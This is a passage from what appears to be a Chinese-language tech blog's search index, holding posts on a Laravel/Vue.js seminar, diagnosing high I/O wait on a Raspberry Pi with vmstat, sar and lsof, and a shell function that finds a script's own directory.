轉個彎日誌</a><br><a href=\"https://www.facebook.com/groups/laravel.tw/permalink/2899482063454157/\" target=\"_blank\" rel=\"noopener\">(1) Laravel 台灣</a></p>\n","categories":["Laravel"],"tags":["laravel"]},{"title":"Laravel 新手實作 Vue.js 簡單使用方法 和 yield 應用","url":"/blog/2019/06/05/Laravel-%E6%96%B0%E6%89%8B%E5%AF%A6%E4%BD%9C-Vue-js-%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-%E5%92%8C-yield-%E6%87%89%E7%94%A8/","content":"<p>今天去聽 Laravel 和 Vue.js 研討會<br>身為學一點 Vue.js 根想學 Laravel<br>這場真的還滿適合我的<br>就報名!!<br>當天回去就寫這篇</p>\n<a id=\"more\"></a>\n<p>首先，今天講了很多 Laravel 的 balde 應用<br>講者從 View 的 balde 開始講<br>特別獎到 <code>yield</code> 預留一個空位意思<br>之前有一些程式會有這個關鍵字，都沒去了解(跪鍵盤</p>\n<p>可以套用 section 進去，當場示範完成 <a href=\"https://www.laragirls.org/\" target=\"_blank\" rel=\"noopener\">LaraGirls|專屬女性的程式學習社群</a> 官網<br>首先，他找 Boostrap 相似版面完成 HTML 排版<br>然後 router , view (搭配 yield, extends ,section, foreach)<br>一小時內完成網站排版(mockup)</p>\n<p>講者大大還說，透過這個可以做出簡單的 mockup<br>在跟使用者談需求的時候<br>非常方便!!!!</p>\n<p>接下來就是 Vue.js</p>\n<ol>\n<li>vue.js 已經包到 Laravel，之接呼叫 component 就可以了(首先載入 app.js 跟 設定 id=app)</li>\n<li>前後端分離</li>\n</ol>\n<p>有空詳細寫</p>\n<p>這個跟 Codeigniter 比起來 View 地方差很多<br>不過 header 選單如何做 active 部份<br>有 google 查了一下</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/29837555/setting-bootstrap-navbar-active-class-in-laravel-5\" target=\"_blank\" rel=\"noopener\">php - Setting Bootstrap navbar active class in Laravel 5 - Stack Overflow</a></li>\n<li><a href=\"https://quickadminpanel.com/blog/laravel-how-to-make-menu-item-active-by-urlroute/\" target=\"_blank\" rel=\"noopener\">Laravel: How to Make Menu Item Active by URL/Route – Quick Admin Panel</a></li>\n<li><a href=\"https://github.com/lavary/laravel-menu\" target=\"_blank\" rel=\"noopener\">lavary/laravel-menu: A quick way to create menus in Laravel 5</a></li>\n</ul>\n<p>研討會投影片和程式內容</p>\n<ul>\n<li><a href=\"https://www.slideshare.net/shengyou/layout-with-blade-and-vue/\" target=\"_blank\" rel=\"noopener\">在 Laravel 裡玩切版</a><br><a href=\"https://github.com/laravel-dojo/20190604-laragirls-layout-with-blade-and-vue-1\" target=\"_blank\" rel=\"noopener\">laravel-dojo/20190604-laragirls-layout-with-blade-and-vue-1: 受邀至 LaraGirls 示範如何使用在 Laravel 裡以三種不同的方式做切版開發。此為現場實作的程式碼範例裡，Laravel 的部份。</a></li>\n<li><a href=\"https://github.com/laravel-dojo/20190604-laragirls-layout-with-blade-and-vue-2\" target=\"_blank\" rel=\"noopener\">laravel-dojo/20190604-laragirls-layout-with-blade-and-vue-2: 受邀至 LaraGirls 示範如何使用在 Laravel 裡以三種不同的方式做切版開發。此為現場實作的程式碼範例裡，Vue 的部份。</a></li>\n</ul>\n","categories":["Laravel"],"tags":["php","laravel"]},{"title":"Linux IO 效能研究怎麼看","url":"/blog/2020/10/03/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/","content":"<p>最近除了看 CPU 使用率過高<br>之前 Raspberry Pi 使用 NextCloud 的時候速度非常慢<br>一直以為是 CPU 關係，但後來發現不是<br>官網友提到是 IO 效能關係</p>\n<a id=\"more\"></a>\n<p>一直以為 IO 效能跟硬碟有關係<br>但後來研究一翻，參考網路上一些文章<br>後來 CPU, RAM, Network … 等等都有關係</p>\n<h2 id=\"IO-效能怎麼看\"><a href=\"#IO-效能怎麼看\" class=\"headerlink\" title=\"IO 效能怎麼看?\"></a>IO 效能怎麼看?</h2><p><a href=\"https://blog.csdn.net/wenniuwuren/article/details/50558183\" target=\"_blank\" rel=\"noopener\">Linux 性能监控 —— 磁盘 I/O_wenniuwuren-CSDN博客</a></p>\n<img src=\"/blog/2020/10/03/Linux-IO-效能研究怎麼看/1.png\" title=\"top\">\n<blockquote>\n<p>二. 如何衡量磁盤 I/O 存在瓶頸<br>磁盤 I/O 是否存在瓶頸取決於當前機器 CPU 的總核數（總核數計算移步我的另一篇博文: Linux 性能監控 —- Load Average）。 公式： X(IO) = 1/（cpu 總核數） 用來衡量磁盤 I/O 情況， 以上圖的機器為例子， 這台機器 2 CPU 12 核 也就是總核心數為 2*12 = 24， X(IO) = 0.04166666 = 4.17%。<br>如果上圖指標長時間大於 4.17%， 那麼我們的網站響應可能就會變慢了。  </p>\n</blockquote>\n<p>簡單來說就是 top<br>CPU 那一行 13 wa 那一行<br> X(IO) = 1/（cpu 總核數）<br>我樹梅派沒有使用百分比，不過他這邊應該沒放</p>\n<h2 id=\"IO-測試方法\"><a href=\"#IO-測試方法\" class=\"headerlink\" title=\"IO 測試方法\"></a>IO 測試方法</h2><p><a href=\"https://blog.toright.com/posts/5051/linux-disk-io-%E6%95%88%E8%83%BD%E6%B8%AC%E8%A9%A6.html/amp\" target=\"_blank\" rel=\"noopener\">blog.toright.com/posts/5051/linux-disk-io-效能測試.html/amp</a></p>\n<p>使用最簡單方法</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">dd <span class=\"keyword\">if</span>=/dev/zero of=/tmp/bench bs=1M count=1024 &amp;&amp; rm /tmp/bench</span><br></pre></td></tr></table></figure>\n<p>在樹梅派使用 SD 做 wa有到 0.25 左右，不過改在 USB 上面<br>wa到 0.5 上下，CPU 雖然沒有吃很高<br>但是這時候很明顯感覺 pietty 操作跟重新開市窗操作連線會變慢<br>看來程式處理速度跟這個數字也有關</p>\n<h2 id=\"安裝-iostat\"><a href=\"#安裝-iostat\" class=\"headerlink\" title=\"安裝 iostat\"></a>安裝 iostat</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt install sysstat</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p><a href=\"https://www.opencli.com/linux/fix-iostat-command-not-found\" target=\"_blank\" rel=\"noopener\">解決 iostat command not found</a></p>\n</li>\n<li><p><a href=\"http://www.51testing.com/html/48/202848-242043.html\" target=\"_blank\" rel=\"noopener\">linux wa%過高，iostat查看io狀況 - 測試天堂 - 51Testing軟件測試網 51Testing軟件測試網-軟件測試人的精神家園</a></p>\n</li>\n</ul>\n<h2 id=\"wa-高不一定是出在硬碟-io\"><a href=\"#wa-高不一定是出在硬碟-io\" class=\"headerlink\" title=\"wa 高不一定是出在硬碟 io\"></a>wa 高不一定是出在硬碟 io</h2><ul>\n<li><a href=\"https://www.lijyyh.com/2012/01/linux.html\" target=\"_blank\" rel=\"noopener\">傲笑紅塵路: 監控Linux 系統效能狀況</a> <a href=\"/blog/2020/10/03/Linux-IO-效能研究怎麼看/web1.png\" title=\"備份圖\">備份圖</a></li>\n</ul>\n<p>可能是網路等等其他<br>這邊有查到 sar 可以查詢 CPU, RAM, Disk I/O, Network </p>\n<p>網路查詢方法<br><a href=\"https://blog.csdn.net/wangjianno2/article/details/39256163\" target=\"_blank\" rel=\"noopener\">使用sar工具进行cpu/mem/io/network等性能分析_@<em>囚徒-2018</em>的家园-CSDN博客</a><br><a href=\"https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/sar.html\" target=\"_blank\" rel=\"noopener\">12. sar 找出系统瓶颈的利器 — Linux Tools Quick Tutorial</a><br><a href=\"https://testerhome.com/topics/20606\" target=\"_blank\" rel=\"noopener\">记一次服务端 IO 瓶颈问题定位 · TesterHome</a></p>\n<p><a href=\"http://technote.aven-network.com/826/using-sar-log-system-resource-status\" target=\"_blank\" rel=\"noopener\">使用 sar 記錄系統資源使用狀態 | TechNote</a></p>\n<p><a href=\"https://matthung0807.blogspot.com/2019/06/linux-htop.html?m=0\" target=\"_blank\" rel=\"noopener\">菜鳥工程師 肉豬: Linux htop 系統程序監控工具簡介</a></p>\n<p><a href=\"https://linuxstory.org/generate-cpu-memory-io-report-sar-command/zh-tw/\" target=\"_blank\" rel=\"noopener\">7 個實例教你使用 sar 命令生成CPU、內存和輸入輸出埠的報告 | Linux Story</a><br><a href=\"https://wayne65.ap.ngrok.io/wp/%E5%A6%82%E4%BD%95%E5%9C%A8raspberry-pi-%E7%94%A8usb%E7%A2%9F%E9%96%8B%E6%A9%9F/\" target=\"_blank\" rel=\"noopener\">如何在Raspberry Pi 用USB碟開機 – Wayne’s Garden</a><br><a href=\"https://learnku.com/articles/39516\" target=\"_blank\" rel=\"noopener\">案例：系统的 CPU 使用率很高，但为啥却找不到高 CPU 的应用？ | Laravel China 社区</a></p>\n<h2 id=\"20201004-查-Raspberry-pi-的-top-CPU-異常飆高\"><a href=\"#20201004-查-Raspberry-pi-的-top-CPU-異常飆高\" class=\"headerlink\" title=\"20201004 查 Raspberry pi 的 top CPU 異常飆高\"></a>20201004 查 Raspberry pi 的 top CPU 異常飆高</h2><h3 id=\"PI-環境簡單介紹\"><a href=\"#PI-環境簡單介紹\" class=\"headerlink\" title=\"PI 環境簡單介紹\"></a>PI 環境簡單介紹</h3><p>之前有使用 rclone 掛載 Google 雲端硬碟<br>但是最近使用 ftp(vsftpd)下載完檔案 發現 wa CPU 標高<br>(中途有遇到我的D朝下載超過容量關係，其他下載失敗)<br>swap 也吃了 80MB(總共 100 MB)<br>swap 應該可能是因為我 rclone 掛載模式關係<br>wa 沒有降下來原因我覺得要找一下</p>\n<h2 id=\"用上面指令查詢經過-可跳過這篇\"><a href=\"#用上面指令查詢經過-可跳過這篇\" class=\"headerlink\" title=\"用上面指令查詢經過(可跳過這篇)\"></a>用上面指令查詢經過(可跳過這篇)</h2><p>這邊有使用 SAR 查看<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@PI203:~ $ sar -r 2 5</span><br><span class=\"line\">Linux 4.19.118-v7+ (PI203)      2020年10月03日  _armv7l_        (4 CPU)</span><br><span class=\"line\"></span><br><span class=\"line\">03時32分26秒 kbmemfree   kbavail kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit  kbactive   kbinact   kbdirty</span><br><span class=\"line\">03時32分28秒     89612    642628    238560     25.16     14860    522124    777284     73.98    185960    542316         0</span><br><span class=\"line\">03時32分30秒     89612    642628    238560     25.16     14860    522124    777284     73.98    186020    542316         0</span><br><span class=\"line\">03時32分32秒     89604    642620    238568     25.16     14860    522124    777284     73.98    186020    542316         0</span><br><span class=\"line\">03時32分34秒     89620    642636    238544     25.16     14860    522128    779252     74.17    186252    542320         0</span><br><span class=\"line\">03時32分36秒     89604    642620    238564     25.16     14860    522124    779252     74.17    186108    542316         0</span><br><span class=\"line\">平均時間：     89610    642626    238559     25.16     14860    522125    778071     74.05    186072    542317         0</span><br><span class=\"line\">pi@PI203:~ $ sar -r 2 5</span><br><span class=\"line\">Linux 4.19.118-v7+ (PI203)      2020年10月03日  _armv7l_        (4 CPU)</span><br><span class=\"line\"></span><br><span class=\"line\">03時32分41秒 kbmemfree   kbavail kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit  kbactive   kbinact   kbdirty</span><br><span class=\"line\">03時32分43秒     89856    642872    238312     25.13     14860    522124    777832     74.03    185968    542316         0</span><br><span class=\"line\">03時32分45秒     89856    642872    238312     25.13     14860    522124    777832     74.03    185968    542316         0</span><br><span class=\"line\">03時32分47秒     89864    642880    238304     25.13     14860    522124    777832     74.03    185968    542316         0</span><br><span class=\"line\">03時32分49秒     89864    642880    238304     25.13     14860    522124    777832     74.03    185968    542316         0</span><br><span class=\"line\">03時32分51秒     89864    642880    238304     25.13     14860    522124    777832     74.03    185968    542316         0</span><br><span class=\"line\">平均時間：     89861    642877    238307     25.13     14860    522124    777832     74.03    185968    542316         0</span><br></pre></td></tr></table></figure></p>\n<p>這邊 commit 怪怪的，網路查好像 commit 需要大於 100%</p>\n<blockquote>\n<p>%commit<br>當前需要的內存/RAM+swap，要保證大於100%，因為內核通常都overcommit內存。</p>\n</blockquote>\n<ul>\n<li><a href=\"https://rorschachchan.github.io/2018/01/03/%E4%BB%8Evmstat%E5%91%BD%E4%BB%A4%E9%87%8C%E7%9C%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%93%B6%E9%A2%88/\" target=\"_blank\" rel=\"noopener\">从vmstat命令里看服务器瓶颈 | Chris Chan’s BLOG</a></li>\n<li><a href=\"https://blog.csdn.net/risen16/article/details/53355417\" target=\"_blank\" rel=\"noopener\">vmstat 的用法和判别系统瓶颈_RisenWang 的博客-CSDN博客</a></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@PI203:~ $ vmstat 1 20</span><br><span class=\"line\">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class=\"line\"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class=\"line\"> 1  1  85568  89920  14888 559472    0    0     2     1    3    2  1  1 98  1  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  178  266  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  175  272  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  164  250  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  202  304  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  183  283  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  180  267  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  161  244  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  166  253  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  177  275  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  190  295  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  188  289  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  179  270  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  177  275  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  175  266  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  164  254  0  0 75 25  0</span><br><span class=\"line\"> 1  1  85568  89896  14888 559472    0    0     0     0  187  289  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  169  255  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  181  283  0  0 75 25  0</span><br><span class=\"line\"> 0  1  85568  89896  14888 559472    0    0     0     0  171  248  0  0 75 25  0</span><br></pre></td></tr></table></figure>\n<p>這邊wa 這麼高，沒有降下來…這邊 top 應該跟 wa 是一樣的東西</p>\n<h2 id=\"vsftp-程式-uninterruptible-sleep-狀態\"><a href=\"#vsftp-程式-uninterruptible-sleep-狀態\" class=\"headerlink\" title=\"vsftp 程式 uninterruptible sleep 狀態\"></a>vsftp 程式 uninterruptible sleep 狀態</h2><p>參照這個shell 找到 vsftp 有問題<a href=\"https://www.503error.com/2016/iowait-%E8%BF%87%E9%AB%98%E9%97%AE%E9%A2%98%E7%9A%84%E6%9F%A5%E6%89%BE%E5%8F%8A%E8%A7%A3%E5%86%B3linux/1035.html\" target=\"_blank\" rel=\"noopener\">iowait 过高问题的查找及解决linux | 张志明的个人博客</a><br>裡面有提到用 iotop 但我看數字都正常</p>\n<h3 id=\"查看-uninterruptible-sleep-程式\"><a href=\"#查看-uninterruptible-sleep-程式\" class=\"headerlink\" title=\"查看 uninterruptible sleep 程式\"></a>查看 uninterruptible sleep 程式</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"> # for x in `seq 1 1 10`; do ps -eo state,pid,cmd | grep &quot;^D&quot;; echo &quot;----&quot;; sleep 5; done</span><br><span class=\"line\">D 18634 /usr/sbin/vsftpd /etc/vsftpd.conf</span><br><span class=\"line\">----</span><br><span class=\"line\">D 18634 /usr/sbin/vsftpd /etc/vsftpd.conf</span><br><span class=\"line\">----</span><br></pre></td></tr></table></figure>\n<p>這邊除了這個方法<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">watch -n 1 &quot;(ps aux | awk &apos;\\$8 ~ /D/  &#123; print \\$0 &#125;&apos;)&quot;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://serverfault.com/questions/61510/linux-how-can-i-see-whats-waiting-for-disk-io\" target=\"_blank\" rel=\"noopener\">Linux - How can I see what’s waiting for disk IO - Server Fault</a></p>\n<p><a href=\"https://serverfault.com/questions/616570/find-process-causing-io-wait-time\" target=\"_blank\" rel=\"noopener\">linux - Find process causing IO wait time - Server Fault</a><br>iotop 不知道能不能看到</p>\n<h3 id=\"lsof-p-18634\"><a href=\"#lsof-p-18634\" class=\"headerlink\" title=\"lsof -p 18634\"></a>lsof -p 18634</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">COMMAND   PID USER   FD      TYPE     DEVICE SIZE/OFF    NODE NAME</span><br><span class=\"line\">vsftpd  18634   pi  cwd   unknown                             /mnt/gdrive/ACG/TV/202007/沒落要塞 DECA-DENCE (stat: Permission denied)</span><br><span class=\"line\">vsftpd  18634   pi  rtd       DIR      179,2     4096       2 /</span><br><span class=\"line\">vsftpd  18634   pi  txt       REG      179,2   113240   24973 /usr/sbin/vsftpd</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2    42632    1674 /lib/arm-linux-gnueabihf/libnss_files-2.28.so</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2    26600    1697 /lib/arm-linux-gnueabihf/librt-2.28.so</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2    17956    1637 /lib/arm-linux-gnueabihf/libcap-ng.so.0.0.0</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2   130416    1693 /lib/arm-linux-gnueabihf/libpthread-2.28.so</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2     9768    1644 /lib/arm-linux-gnueabihf/libdl-2.28.so</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2   116032    1580 /lib/arm-linux-gnueabihf/libaudit.so.1.0.0</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2    71576    1671 /lib/arm-linux-gnueabihf/libnsl-2.28.so</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2  1296004    1636 /lib/arm-linux-gnueabihf/libc-2.28.so</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2    17872    1638 /lib/arm-linux-gnueabihf/libcap.so.2.25</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2  2118048   15238 /usr/lib/arm-linux-gnueabihf/libcrypto.so.1.1</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2   454924   15239 /usr/lib/arm-linux-gnueabihf/libssl.so.1.1</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2    50896    2417 /lib/arm-linux-gnueabihf/libpam.so.0.84.2</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2    30508    1715 /lib/arm-linux-gnueabihf/libwrap.so.0.7.6</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2    17708   14650 /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so</span><br><span class=\"line\">vsftpd  18634   pi  mem       REG      179,2   138604    1559 /lib/arm-linux-gnueabihf/ld-2.28.so</span><br><span class=\"line\">vsftpd  18634   pi    0u     sock        0,8      0t0 2903508 protocol: TCPv6</span><br><span class=\"line\">vsftpd  18634   pi    1u     sock        0,8      0t0 2903508 protocol: TCPv6</span><br><span class=\"line\">vsftpd  18634   pi    2u     sock        0,8      0t0 2903508 protocol: TCPv6</span><br><span class=\"line\">vsftpd  18634   pi    3w      REG      179,2    37351    1427 /var/log/vsftpd.log.1</span><br><span class=\"line\">vsftpd  18634   pi    4r  unknown                             /mnt/gdrive/ACG/TV/202007/沒落要塞 DECA-DENCE/[Airota][Deca-Dence][05][1080p AVC AAC][CHT].mp4 (stat: Permission denied)</span><br><span class=\"line\">vsftpd  18634   pi    5u     unix 0x97115dd6      0t0 2898890 type=STREAM</span><br><span class=\"line\">vsftpd  18634   pi    6u     sock        0,8      0t0 2907724 protocol: TCPv6</span><br></pre></td></tr></table></figure>\n<p>這邊查了一下</p>\n<blockquote>\n<p>產生D狀態的原因出現uninterruptible sleep狀態的進程一般是因為在等待IO，例如磁盤IO、網絡IO等。在發出的IO請求得不到相應之後，進程一般就會轉入uninterruptible sleep狀態，例如若NFS服務端關閉時，如果沒有事先amount相關目錄。在客戶端執行df的話就會掛住整個會話，再用ps axf查看的話會發現df進程狀態位已經變成D。</p>\n</blockquote>\n<p><a href=\"https://www.cnblogs.com/xiaotengyi/p/7644336.html\" target=\"_blank\" rel=\"noopener\">Linux 進程的 Uninterruptible sleep(D) 狀態 - Still water run deep - 開發者的網上家園</a></p>\n<p>vmstat 可以看到 第二個 b 確實我顯示有 1(可參照上面)</p>\n<blockquote>\n<p>由於只有運行狀態的進程才可以接受信號，所以處於uninterruptible sleep的進程，是無法用kill命令殺掉的，即使是加9或15的信號。</p>\n</blockquote>\n<p>但要該怎麼處理呢?</p>\n<blockquote>\n<p>正是因為得不到IO的響應，進程才進入了uninterruptible sleep狀態，所以要想使進程從uninterruptible sleep狀態恢復，就得使進程等待的IO恢復，比如如果是因為從遠程掛載的NFS卷不可訪問導致進程進入uninterruptible sleep狀態的，那麼可以通過恢復該NFS卷的連接來使進程的IO請求得到滿足，除此之外，要想幹掉處在D狀態進程就只能重啟整個Linux系統（D進程並不能通過kill 和kill -9 殺掉） 。<br>作者：不穿格子衫的程序猿<br>链接：<a href=\"https://www.jianshu.com/p/8f29d6d70fd6\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/8f29d6d70fd6</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>\n</blockquote>\n<p><a href=\"https://www.jianshu.com/p/8f29d6d70fd6\" target=\"_blank\" rel=\"noopener\">進程查看命令 - 簡書</a></p>\n<h3 id=\"亂打亂撞解決\"><a href=\"#亂打亂撞解決\" class=\"headerlink\" title=\"亂打亂撞解決\"></a>亂打亂撞解決</h3><p>網路上說無法kill強制刪掉<br>這邊我決定 kill 掉看看<br>一般 kill 無法<br>但 kill -9 就刪掉了…<br>這邊就不繼續探討了</p>\n<p>top wa 就正常了…</p>\n<p>簡單回顧重點</p>\n<p>vmstat 第二個 b 可以先確認 uninterruptible sleep程式<br>再尋找 uninterruptible sleep 程式做處理</p>\n<h2 id=\"wa-和-id\"><a href=\"#wa-和-id\" class=\"headerlink\" title=\"wa 和 id\"></a>wa 和 id</h2><blockquote>\n<p>當前的CPU運行情況：</p>\n<p>us：非nice用戶進程佔用CPU的比率<br>sy：內核、內核進程佔用CPU的比率；<br>ni：如果一些用戶進程修改過優先級，這裡顯示這些進程佔用CPU時間的比率；<br>id：CPU空閒比率，如果系統緩慢而這個值很高，說明系統慢的原因不是CPU負載高；<br>wa：CPU等待執行I/O操作的時間比率，該指標可以用來排查磁盤I/O的問題，通常結合wa和id判斷<br>hi：CPU處理硬件終端所佔時間的比率；<br>si：CPU處理軟件終端所佔時間的比率；<br>st：流逝的時間，虛擬機中的其他任務所佔CPU時間的比率；</p>\n<p>用戶進程佔比高，wa低，說明系統緩慢的原因在於進程佔用大量CPU，通常還會伴有教低的id，說明CPU空轉時間很少；<br>wa低，id高，可以排除CPU資源瓶頸的可能。<br>wa高，說明I/O佔用了大量的CPU時間，需要檢查交換空間的使用，交換空間位於磁盤上，性能遠低於內存，當內存耗盡開始使用交換空間時，將會給性能帶來嚴重影響，所以對於性能要求較高的服務器，一般建議關閉交換空間。另一方面，如果內存充足，但wa很高，說明需要檢查哪個進程佔用了大量的I/O資源。</p>\n</blockquote>\n<ul>\n<li><a href=\"https://www.cnblogs.com/security-darren/p/4700384.html\" target=\"_blank\" rel=\"noopener\">Linux系统排查2——CPU负载篇 - 王智愚 - 开发者的网上家园</a></li>\n<li><a href=\"https://zhqqqy.github.io/2018/08/23/Linux%E4%B8%8B%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/\" target=\"_blank\" rel=\"noopener\">Linux下性能分析工具 | zhqqqy</a></li>\n</ul>\n<p>CPU使用率低但負載高<br><img src=\"https://upload-images.jianshu.io/upload_images/16898515-1f65ff3be1502b87.png?imageMogr2/auto-orient/strip|imageView2/2/w/585\" alt=\"\"></p>\n<p>load average 是對 CPU 負載的評估，其值越高，說明其任務隊列越長，處於等待執行的任務越多。但CPU卻在摸魚（idls高），這就說明有可能有很多假死進程，可能寫的程序有等待（I/O）或者睡眠。</p>\n<p>作者：Carson_dotnet<br>链接：<a href=\"https://www.jianshu.com/p/27d8c33e03cf\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/27d8c33e03cf</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。<br><a href=\"https://www.jianshu.com/p/27d8c33e03cf\" target=\"_blank\" rel=\"noopener\">Linux CPU過載判斷以及分析 - 簡書</a></p>\n","categories":["Linux"],"tags":["linux","io"]},{"title":"Linux/Windows 執行腳本抓取當前腳本路徑方法","url":"/blog/2020/09/10/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/","content":"<p>我們很長寫腳本，在任意A目錄當執行<code>不同的B目錄</code>的腳本抓取路徑是A<br>但實務上有時候希望抓到B目錄<br>最近在想這個有什麼方法</p>\n<a id=\"more\"></a>\n<h2 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h2><p>以下都是參考:<a href=\"https://www.opencli.com/linux/shell-script-get-script-location\" target=\"_blank\" rel=\"noopener\">Shell Script 取得 Script 所在目錄位置</a></p>\n<h3 id=\"不嚴謹\"><a href=\"#不嚴謹\" class=\"headerlink\" title=\"不嚴謹\"></a>不嚴謹</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/usr/bin/sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$0</span></span><br></pre></td></tr></table></figure>\n<p>但某時候會遇到問題<br>如./test.sh</p>\n<p>這樣就會抓出 ./test.sh</p>\n<p>參考:<a href=\"https://www.opencli.com/linux/shell-script-get-script-location\" target=\"_blank\" rel=\"noopener\">Shell Script 取得 Script 所在目錄位置</a></p>\n<h3 id=\"嚴謹\"><a href=\"#嚴謹\" class=\"headerlink\" title=\"嚴謹\"></a>嚴謹</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/usr/bin/sh</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">get_script_dir</span></span> () &#123;</span><br><span class=\"line\">     SOURCE=<span class=\"string\">\"<span class=\"variable\">$&#123;BASH_SOURCE[0]&#125;</span>\"</span></span><br><span class=\"line\">     <span class=\"comment\"># While $SOURCE is a symlink, resolve it</span></span><br><span class=\"line\">     <span class=\"keyword\">while</span> [ -h <span class=\"string\">\"<span class=\"variable\">$SOURCE</span>\"</span> ]; <span class=\"keyword\">do</span></span><br><span class=\"line\">          DIR=<span class=\"string\">\"<span class=\"variable\">$( cd -P \"$( dirname \"$SOURCE\" )</span>\"</span> &amp;&amp; <span class=\"built_in\">pwd</span> )<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">          SOURCE=\"</span>$( readlink <span class=\"string\">\"<span class=\"variable\">$SOURCE</span>\"</span> )<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">          # If <span class=\"variable\">$SOURCE</span> was a relative symlink (so no \"</span>/<span class=\"string\">\" as prefix, need to resolve it relative to the symlink base directory</span></span><br><span class=\"line\"><span class=\"string\">          [[ <span class=\"variable\">$SOURCE</span> != /* ]] &amp;&amp; SOURCE=\"</span><span class=\"variable\">$DIR</span>/<span class=\"variable\">$SOURCE</span><span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">     done</span></span><br><span class=\"line\"><span class=\"string\">     DIR=\"</span>$( <span class=\"built_in\">cd</span> -P <span class=\"string\">\"<span class=\"variable\">$( dirname \"$SOURCE\" )</span>\"</span> &amp;&amp; <span class=\"built_in\">pwd</span> )<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">     echo \"</span><span class=\"variable\">$DIR</span><span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">echo \"</span>$(get_script_dir)<span class=\"string\">\"</span></span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://www.opencli.com/linux/shell-script-get-script-location\" target=\"_blank\" rel=\"noopener\">Shell Script 取得 Script 所在目錄位置</a></p>\n<h2 id=\"windows\"><a href=\"#windows\" class=\"headerlink\" 